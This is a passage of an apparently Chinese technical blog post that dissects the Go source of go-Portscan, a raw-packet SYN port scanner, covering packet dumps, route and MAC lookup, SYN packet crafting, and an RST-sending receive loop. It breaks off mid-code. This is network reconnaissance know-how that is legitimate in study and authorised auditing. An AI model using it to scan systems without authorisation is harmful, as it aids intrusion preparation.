Sequence Number: 1    (relative sequence number)]<br>    Acknowledgment Number: 1    (relative ack number)<br>    Acknowledgment number (raw): 3976647632# ACK 应答 = 客户端的 SEQ + 1<br>    1000 .... = Header Length: 32 bytes (8)<br>    Flags: 0x012 (SYN, ACK)# 标志位 SYN, ACK<br>        000. .... .... = Reserved: Not set<br>        ...0 .... .... = Nonce: Not set<br>        .... 0... .... = Congestion Window Reduced (CWR): Not set<br>        .... .0.. .... = ECN-Echo: Not set<br>        .... ..0. .... = Urgent: Not set<br>        .... ...1 .... = Acknowledgment: Set<br>        .... .... 0... = Push: Not set<br>        .... .... .0.. = Reset: Not set<br>        .... .... ..1. = Syn: Set<br>        .... .... ...0 = Fin: Not set<br>        [TCP Flags: ·······A··S·]<br>    Window: 29200<br>    [Calculated window size: 29200]<br>    Checksum: 0x6b37 [unverified]<br>    [Checksum Status: Unverified]<br>    Urgent Pointer: 0<br>    Options: (12 bytes), Maximum segment size, No-Operation (NOP), No-Operation (NOP), SACK permitted, No-Operation (NOP), Window scale<br>    [SEQ/ACK analysis]<br>    [Timestamps]<br></code></pre></td></tr></table></figure><p>可以看到，如果需要去构造一个 SYN 请求需要这些字段：</p><ol><li>源 MAC、目标 MAC</li><li>源 IP、目标 IP</li><li>源端口、目标端口</li><li>SEQ</li></ol><p>其他字段都可以去固定，或者生成，只有这些是需要我们指定的。</p><p>目标 MAC 的获取是需要 ARP ，简单介绍一下，这个协议是用来寻找 IP 地址对应的 MAC 地址的，注意是内网 IP 对应的 MAC ~</p><p>对应公网 IP 我们的目的 MAC 就是我们网卡的 MAC 地址 ~</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">ARP 请求</span><br>Address Resolution Protocol (request)<br>    Hardware type: Ethernet (1)<br>    Protocol type: IPv4 (0x0800)<br>    Hardware size: 6<br>    Protocol size: 4<br>    Opcode: request (1)<br>    Sender MAC address: HuaweiTe_2b:54:37 (10:c1:72:2b:54:37) # 源 MAC<br>    Sender IP address: 192.168.100.1 # 源 IP<br>    Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)<br>    Target IP address: 192.168.100.21 # 目标 IP<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ARP 响应</span><br>Address Resolution Protocol (reply)<br>    Hardware type: Ethernet (1)<br>    Protocol type: IPv4 (0x0800)<br>    Hardware size: 6<br>    Protocol size: 4<br>    Opcode: reply (2)<br>    Sender MAC address: f0:a6:54:9e:08:07 (f0:a6:54:9e:08:07)# 源 MAC 也就是请求收到响应了<br>    Sender IP address: 192.168.100.21# 源 IP<br>    Target MAC address: HuaweiTe_2b:54:37 (10:c1:72:2b:54:37)<br>    Target IP address: 192.168.100.1<br></code></pre></td></tr></table></figure><p>接下来就看 go-Portscan 是怎样实现这些的吧。</p><h3 id="SYN-扫描"><a href="#SYN-扫描" class="headerlink" title="SYN 扫描"></a>SYN 扫描</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">comm.<span class="hljs-keyword">go</span><span class="hljs-comment">// 配置信息 ( 速率、超时时间 )</span><br>device.<span class="hljs-keyword">go</span><span class="hljs-comment">// 设备信息 ( 源 IP、MAC、网关 MAC、活动的网卡名称 )</span><br>syn.<span class="hljs-keyword">go</span><span class="hljs-comment">// SYN 端口扫描的主逻辑</span><br>watchIpStatus.<span class="hljs-keyword">go</span><span class="hljs-comment">// IP 状态表 ( 用于监听线程的超时、是否为目标的 SYN+ACK 报文的判断 )</span><br>watchMacCache.<span class="hljs-keyword">go</span><span class="hljs-comment">// MAC 状态表 ( 监听线程获取的 ARP 响应中的 IP 和 MAC )</span><br></code></pre></td></tr></table></figure><p>先整体过一遍代码，再去按照流程进行分析。</p><p><code>device.go</code> 就是去获取网卡信息，源 IP、MAC、网关 MAC、网卡名称 </p><p>也对应了上面说的 SYN 请求包需要的一些信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 获取所有 pcap 网卡的名称</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetAllDevs</span><span class="hljs-params">()</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>pcapDevices, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, errors.New(fmt.Sprintf(<span class="hljs-string">&quot;list pcapDevices failed: %s&quot;</span>, err.Error()))<br>&#125;<br><span class="hljs-keyword">var</span> buf strings.Builder<br><span class="hljs-keyword">for</span> _, dev := <span class="hljs-keyword">range</span> pcapDevices &#123;<br>buf.WriteString(fmt.Sprint(<span class="hljs-string">&quot;Dev:&quot;</span>, dev.Name, <span class="hljs-string">&quot;\tDes:&quot;</span>, dev.Description))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dev.Addresses) &gt; <span class="hljs-number">0</span> &#123;<br>buf.WriteString(fmt.Sprint(<span class="hljs-string">&quot;\tAddr:&quot;</span>, dev.Addresses[<span class="hljs-number">0</span>].IP.String()))<br>&#125;<br>buf.WriteString(<span class="hljs-string">&quot;\n&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> buf.String(), <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 通过 IP 获取网卡名称</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetDevByIp</span><span class="hljs-params">(ip net.IP)</span></span> (devName <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;<br>devices, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">for</span> _, d := <span class="hljs-keyword">range</span> devices &#123;<br><span class="hljs-keyword">for</span> _, address := <span class="hljs-keyword">range</span> d.Addresses &#123;<br>_ip := address.IP.To4()<br><span class="hljs-keyword">if</span> _ip != <span class="hljs-literal">nil</span> &amp;&amp; _ip.IsGlobalUnicast() &amp;&amp; _ip.Equal(ip) &#123;<br><span class="hljs-keyword">return</span> d.Name, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, errors.New(<span class="hljs-string">&quot;can not find dev&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// 通过 IP 获取获取指定网络接口的信息 IP MAC</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetIfaceMac</span><span class="hljs-params">(ifaceAddr net.IP)</span></span> (src net.IP, mac net.HardwareAddr) &#123;<br>interfaces, _ := net.Interfaces()<br><span class="hljs-keyword">for</span> _, iface := <span class="hljs-keyword">range</span> interfaces &#123;<br><span class="hljs-keyword">if</span> addrs, err := iface.Addrs(); err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, addr := <span class="hljs-keyword">range</span> addrs &#123;<br><span class="hljs-keyword">if</span> addr.(*net.IPNet).Contains(ifaceAddr) &#123;<br><span class="hljs-keyword">return</span> addr.(*net.IPNet).IP, iface.HardwareAddr<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 获取指定网关（Gateway）IP地址所在网络接口的IP地址、MAC地址、设备名称</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetMacByGw</span><span class="hljs-params">(gw net.IP)</span></span> (srcIp net.IP, srcMac net.HardwareAddr, devname <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 获取指定网关IP地址所在网络接口的IP地址和MAC地址</span><br>    srcIp, srcMac = GetIfaceMac(gw)<br><span class="hljs-keyword">if</span> srcIp == <span class="hljs-literal">nil</span> &#123;<br>err = errors.New(<span class="hljs-string">&quot;can not find this dev by gw&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>srcIp = srcIp.To4()<br>devices, err := pcap.FindAllDevs()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>    <span class="hljs-comment">// 通过刚刚的IP获取出设备地址</span><br><span class="hljs-keyword">for</span> _, d := <span class="hljs-keyword">range</span> devices &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(d.Addresses) &gt; <span class="hljs-number">0</span> &amp;&amp; d.Addresses[<span class="hljs-number">0</span>].IP.String() == srcIp.String() &#123;<br>devname = d.Name<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>err = errors.New(<span class="hljs-string">&quot;can not find this dev&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 通过 IP 获取路由信息</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetRouterV4</span><span class="hljs-params">(dst net.IP)</span></span> (srcIp net.IP, srcMac net.HardwareAddr, gw net.IP, devName <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 同网段</span><br>srcIp, srcMac = GetIfaceMac(dst)<br><span class="hljs-keyword">if</span> srcIp == <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-comment">// 通过 github.com/libp2p/go-netroute 来获取路由信息 =&gt; 网关 源 IP </span><br><span class="hljs-keyword">var</span> r routing.Router<br>r, err = netroute.New()<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">var</span> iface *net.Interface<br>iface, gw, srcIp, err = r.Route(dst)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>                <span class="hljs-comment">// 获取 MAC 地址</span><br><span class="hljs-keyword">if</span> iface != <span class="hljs-literal">nil</span> &#123;<br>srcMac = iface.HardwareAddr<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, srcMac = GetIfaceMac(srcIp)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || srcMac == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 取第一个默认路由</span><br>gw, err = gateway.DiscoverGateway()<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>srcIp, srcMac = GetIfaceMac(gw)<br>&#125;<br>&#125;<br>&#125;<br>gw = gw.To4()<br>srcIp = srcIp.To4()<br>    <span class="hljs-comment">// 获取设备名称</span><br>devName, err = GetDevByIp(srcIp)<br><span class="hljs-keyword">if</span> srcIp == <span class="hljs-literal">nil</span> || err != <span class="hljs-literal">nil</span> || srcMac == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;err&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;&quot;</span>, fmt.Errorf(<span class="hljs-string">&quot;no router, %s&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是 <code>syn.go</code> 这是 SYN 扫描的主逻辑：</p><p><code>NewSynScanner</code> 这里就是先获取下设备的基础信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 获取基础信息</span><br><span class="hljs-keyword">if</span> option.NextHop != <span class="hljs-string">&quot;&quot;</span> &#123;<br>    gw = net.ParseIP(option.NextHop).To4()<br>    srcIp, srcMac, devName, err = GetMacByGw(gw)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    srcIp, srcMac, gw, devName, err = GetRouterV4(firstIp)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后把这些信息传入 SynScanner，因为这些基本每个 SYN 包都要使用，所以先获取了。</p><p>然后就是设置过滤器，启动监听协程了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">handle, err := pcap.OpenLive(devName, <span class="hljs-number">1024</span>, <span class="hljs-literal">false</span>, pcap.BlockForever)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// ARP 或者 SYN ACK 报文</span><br>handle.SetBPFFilter(fmt.Sprintf(<span class="hljs-string">&quot;ether dst %s &amp;&amp; (arp || tcp[tcpflags] == tcp-syn|tcp-ack)&quot;</span>, srcMac.String()))<br>ss.handle = handle<br><br><span class="hljs-comment">// 启动监听协程</span><br><span class="hljs-keyword">go</span> ss.recv()<br></code></pre></td></tr></table></figure><p>监听这里：</p><ol><li>ARP 响应：获取其 MAC 地址，存入 MAC 表中</li><li>ACK 响应：先看 IP 表，是否有，是否监听超时了，如果没有就记录下来，再响应其一个 RST 报文</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">// ....</span><br>    <span class="hljs-keyword">if</span> arpLayer.SourceProtAddress != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-comment">// ARP 响应获取其中的 IP MAC 存入到 MAC 监视表</span><br>        ipStr = net.IP(arpLayer.SourceProtAddress).String()<br>        <span class="hljs-keyword">if</span> ss.watchMacCacheT.IsNeedWatch(ipStr) &#123;<br>            ss.watchMacCacheT.SetMac(ipStr, arpLayer.SourceHwAddress)<br>        &#125;<br>        arpLayer.SourceProtAddress = <span class="hljs-literal">nil</span> <span class="hljs-comment">// clean arp parse status</span><br>        <span class="hljs-keyword">continue</span><br>    &#125;<br>    <span class="hljs-comment">// TCP 协议 并且是响应给我们的报文 ( 通过端口判断, 发包指定的端口是有范围的 )</span><br>    <span class="hljs-keyword">if</span> tcpLayer.DstPort != <span class="hljs-number">0</span> &amp;&amp; tcpLayer.DstPort &gt;= <span class="hljs-number">49000</span> &amp;&amp; tcpLayer.DstPort &lt;= <span class="hljs-number">59000</span> &#123;<br>        ipStr = ipLayer.SrcIP.String()<br>        _port = <span class="hljs-type">uint16</span>(tcpLayer.SrcPort)<br>        <span class="hljs-comment">// 判断 IP 是否为目标 IP</span><br>        <span class="hljs-keyword">if</span> !ss.watchIpStatusT.HasIp(ipStr) &#123; <br>            <span class="hljs-keyword">continue</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> ss.watchIpStatusT.HasPort(ipStr, _port) &#123; <span class="hljs-comment">// PORT</span><br>                <span class="hljs-keyword">continue</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ss.watchIpStatusT.RecordPort(ipStr, _port) <span class="hljs-comment">// record</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 如果是 SYN ACK</span><br>        <span class="hljs-keyword">if</span> tcpLayer.SYN &amp;&amp; tcpLayer.ACK &#123;<br>            <span class="hljs-comment">// 收集开放端口</span><br>            ss.openPortChan &lt;- port.OpenIpPort&#123;<br>                Ip:   ipLayer.SrcIP,<br>                Port: _port,<br>            &#125;<br>            <span class="hljs-comment">// 解析信息 发送 RST 报文</span><br>            eth.DstMAC = ethLayer.SrcMAC<br>            ip4.DstIP = ipLayer.SrcIP<br>            tcp.DstPort = tcpLayer.SrcPort<br>            tcp.SrcPort = tcpLayer.DstPort<br>            <span class="hljs-comment">// RST &amp;&amp; ACK</span><br>            tcp.Ack = tcpLayer.Seq + <span class="hljs-number">1</span><br>            tcp.Seq = tcpLayer.Ack<br>            tcp.SetNetworkLayerForChecksum(&amp;ip4)<br>            ss.send(&amp;eth, &amp;ip4, &amp;tcp)<br>        &#125;<br>        tcpLayer.DstPort = <span class="hljs-number">0</span> <span class="hljs-comment">// clean tcp parse status</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后看看发包：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ss *SynScanner)</span></span> Scan(dstIp net.IP, dst <span class="hljs-type">uint16</span>) (err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 速率限制</span><br><span class="hljs-comment">// 与 recv 协同，当队列缓冲区到达80%时降半速，90%将为1/s</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ss.openPortChan)*<span class="hljs-number">10</span> &gt;= <span class="hljs-built_in">cap</span>(ss.openPortChan)*<span class="hljs-number">8</span> &#123;<br><span class="hljs-keyword">if</span> ss.option.Rate/<span class="hljs-number">2</span> != <span class="hljs-number">0</span> &#123;<br>ss.limiter.SetLimit(limiter.Every(time.Second / time.Duration(ss.option.Rate/<span class="hljs-number">2</span>)))<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ss.openPortChan)*<span class="hljs-number">10</span> &gt;= <span class="hljs-built_in">cap</span>(ss.openPortChan)*<span class="hljs-number">9</span> &#123;<br>ss.limiter.SetLimit(<span class="hljs-number">1</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ss.limiter.SetLimit(limiter.Every(time.Second / time.Duration(ss.option.Rate)))<br>&#125;<br><br>dstIp = dstIp.To4()<br><span class="hljs-keyword">if</span> dstIp == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;is not ipv4&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">// 添加到 IP 监视表中 =&gt; 记录好更新时间</span><br>ipStr := dstIp.String()<br>ss.watchIpStatusT.UpdateLastTime(ipStr)<br><br><span class="hljs-comment">// 获取目标 MAC 地址</span><br><span class="hljs-keyword">var</span> dstMac net.HardwareAddr<br><span class="hljs-keyword">if</span> ss.gwMac != <span class="hljs-literal">nil</span> &#123;<br>dstMac = ss.gwMac<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 内网IP =&gt; MAC 就是网卡的 MAC</span><br>mac := ss.watchMacCacheT.GetMac(ipStr)<br><span class="hljs-keyword">if</span> mac != <span class="hljs-literal">nil</span> &#123;<br>dstMac = mac<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 通过 ARP 请求获取目的 MAC</span><br>dstMac, err = ss.getHwAddrV4(dstIp)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 构造 SYN 数据包</span><br>    <span class="hljs-comment">// 网络接口层</span><br>eth := layers.Ethernet&#123;<br>SrcMAC:       ss.srcMac,<br>DstMAC:       dstMac,<br>EthernetType: layers.EthernetTypeIPv4,<br>&#125;<br>    <span class="hljs-comment">// 网络层</span><br>ip4 := layers.IPv4&#123;<br>SrcIP:    ss.srcIp,<br>DstIP:    dstIp,<br>Version:  <span class="hljs-number">4</span>,<br>TTL:      <span class="hljs-number">128</span>,<br>Id:       <span class="hljs-type">uint16</span>(<span class="hljs-number">40000</span> + rand.Intn(<span class="hljs-number">10000</span>)),<br>Flags:    layers.IPv4DontFragment,<br>Protocol: layers.IPProtocolTCP,<br>&#125;<br>    <span class="hljs-comment">// 传输层</span><br>tcp := layers.TCP&#123;<br>        <span class="hljs-comment">// 随机源端口 限定了范围 在监听哪里就使用了这个去做过滤</span><br>SrcPort: layers.TCPPort(<span class="hljs-number">49000</span> + rand.Intn(<span class="hljs-number">10000</span>)), <span class="hljs-comment">// Random source port and used to determine recv dst port range</span><br>DstPort: layers.TCPPort(dst),<br>SYN:     <span class="hljs-literal">true</span>,<br>Window:  <span class="hljs-number">65280</span>,<br>Seq:     <span class="hljs-type">uint32</span>(<span class="hljs-number">500000</span> + rand.Intn(<span class="hljs-number">10000</span>)),<br>Options: []layers.TCPOption&#123;<br>&#123;<br>OptionType:   layers.TCPOptionKindMSS,<br>OptionLength: <span class="hljs-number">4</span>,<br>OptionData:   []<span class="hljs-type">byte</span>&#123;<span class="hljs-number">0x05</span>, <span class="hljs-number">0x50</span>&#125;, <span class="hljs-comment">// 1360</span><br>&#125;,<br>&#123;<br>OptionType: layers.TCPOptionKindNop,<br>&#125;,<br>&#123;<br>OptionType:   layers.TCPOptionKindWindowScale,<br>OptionLength: <span class="hljs-number">3</span>,<br>OptionData:   []<span class="hljs-type">byte</span>&#123;<span class="hljs-number">0x08</span>&#125;,<br>&#125;,<br>&#123;<br>OptionType: layers.TCPOptionKindNop,<br>&#125;,<br>&#123;<br>OptionType: layers.TCPOptionKindNop,<br>&#125;,<br>&#123;<br>OptionType:   layers.TCPOptionKindSACKPermitted,<br>OptionLength: <span class="hljs-number">2</span>,<br>&#125;,<br>&#125;,<br>&#125;<br>tcp.SetNetworkLayerForChecksum(&amp;ip4)<br><br><span class="hljs-comment">// 发包</span><br>ss.send(&amp;eth, &amp;ip4, &amp;tcp)<br><br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>它这里的发包使用了一个 buf 池，这个比较好，复用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ss *SynScanner)</span></span> send(l ...gopacket.SerializableLayer) <span class="hljs-type">error</span> &#123;<br>buf := ss.bufPool.Get().(gopacket.SerializeBuffer)<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>buf.Clear()<br>ss.bufPool.Put(buf)<br>&#125;()<br><span class="hljs-keyword">if</span> err := gopacket.SerializeLayers(buf, ss.opts, l...); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> ss.handle.WritePacketData(buf.Bytes())<br>&#125;<br></code></pre></td></tr></table></figure><p>在看一下它的 ARP 获取 MAC 的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 